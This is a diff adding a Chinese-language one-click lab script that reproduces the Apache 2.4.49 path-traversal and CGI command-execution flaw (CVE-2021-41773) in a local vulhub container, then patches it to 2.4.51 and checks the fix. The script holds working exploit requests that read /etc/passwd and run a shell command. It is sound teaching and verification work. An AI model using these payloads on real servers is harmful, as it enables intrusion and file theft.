@@ -11,6 +11,58 @@
 
 > 实例销毁后环境就没了 —— **每一步都截图**，截图就是你的证据。
 
+## 一键脚本（想省事就粘这一整段）
+
+在实例终端里粘贴下面整块：它会起漏洞版、复现、打补丁、再验证，并在关键处停住等你看。
+
+```bash
+set -u
+git clone --depth 1 https://github.com/vulhub/vulhub.git
+cd vulhub/httpd/CVE-2021-41773
+
+echo '=== 1. 起漏洞版 (2.4.49) ==='
+docker compose up -d --build
+sleep 3
+curl -s -o /dev/null -w 'home page: %{http_code}\n' http://127.0.0.1:8080/
+
+echo
+echo '=== 2. 路径穿越读 /etc/passwd  <-- 截图 1 ==='
+curl --path-as-is 'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+
+echo
+echo '=== 3. CGI 穿越执行命令  <-- 截图 1 ==='
+curl --path-as-is --data 'echo;id' \
+  'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
+
+echo
+read -p '看完并截图后按回车继续打补丁...' _
+
+echo '=== 4. 打补丁：只改一行版本 ==='
+docker compose down
+sed -i 's|FROM vulhub/httpd:2.4.49|FROM httpd:2.4.51|' Dockerfile
+grep '^FROM' Dockerfile
+docker compose up -d --build
+sleep 3
+
+echo
+echo '=== 5. 验证修复  <-- 截图 2 ==='
+for p in \
+  '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' \
+  '/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' \
+  '/.%2e/.%2e/.%2e/.%2e/etc/passwd' \
+  '/icons/..%2f..%2f..%2f..%2fetc%2fpasswd' ; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' --path-as-is "http://127.0.0.1:8080$p")
+  printf '%s  %s\n' "$code" "$p"
+done
+echo -n 'home page still: '
+curl -s http://127.0.0.1:8080/ | head -1
+
+docker compose down
+echo 'done.'
+```
+
+预期：第 2、3 步打印 `root:x:0:0:...` 和 `uid=...`；第 5 步全部 `404`，首页仍是 `It works!`。
+
 ## 1. 起漏洞环境（Apache 2.4.49）
 
 ```bash
